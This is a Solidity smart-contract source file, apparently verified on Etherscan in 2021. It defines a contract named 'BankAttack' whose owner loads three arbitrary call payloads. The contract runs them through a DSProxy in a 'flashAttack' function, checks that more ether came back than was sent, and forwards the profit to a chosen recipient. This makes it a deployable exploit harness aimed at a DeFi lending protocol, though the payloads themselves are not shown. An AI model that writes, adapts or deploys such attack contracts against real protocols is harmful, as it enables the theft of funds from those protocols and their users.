/**
 *Submitted for verification at Etherscan.io on 2021-05-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, 'SafeMath: addition overflow');

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, 'SafeMath: subtraction overflow');
  }

  function sub(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, 'SafeMath: multiplication overflow');

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, 'SafeMath: division by zero');
  }

  function div(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, 'SafeMath: modulo by zero');
  }

  function mod(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}



//0x8a347485eaa69206eb1a299472eb7495e36448bb

interface IDSProxy{
    
    function execute(bytes calldata _code, bytes calldata _data)
        external
        payable
        returns (address target, bytes32 response);
    
    function execute(address _target, bytes calldata _data)
        external
        payable
        returns (address target, bytes32 response);
    
}

contract BankAttack {
    using SafeMath for uint256;
    
    address public proxy;
    address public owner;
    
    uint256 public WAD = 1 ether;
    
    constructor() public {
        owner = msg.sender;
    }
    
    modifier onlyOwner(){
        require(msg.sender == owner, "!owner");
        _;
    }
    
    function updateProxy(address _proxy) external onlyOwner {
        proxy = _proxy;
    }
    
    receive () payable external {

    }

    fallback () payable external {
    
    }
    
    
    bytes public call1;
    bytes public call2;
    bytes public call3;
    
    function setCall1(bytes calldata _call1) external onlyOwner {
        call1 = _call1;
    }
    
    function setCall2(bytes calldata _call2) external onlyOwner {
        call2 = _call2;
    }    
    
    function setCall3(bytes calldata _call3) external onlyOwner {
        call3 = _call3;
    }
    
    function flashAttack(bytes calldata code, address payable receipent) external payable onlyOwner {
        
        IDSProxy(proxy).execute{value: msg.value}(code, call1);
        
        IDSProxy(proxy).execute(code, call2);
        
        IDSProxy(proxy).execute(code, call3);

        require(address(this).balance > msg.value, "Not received enough ether");
        
        receipent.transfer(address(this).balance);
        
    }
    

    function withdraw() external onlyOwner{
        msg.sender.transfer(address(this).balance);
    }
    
}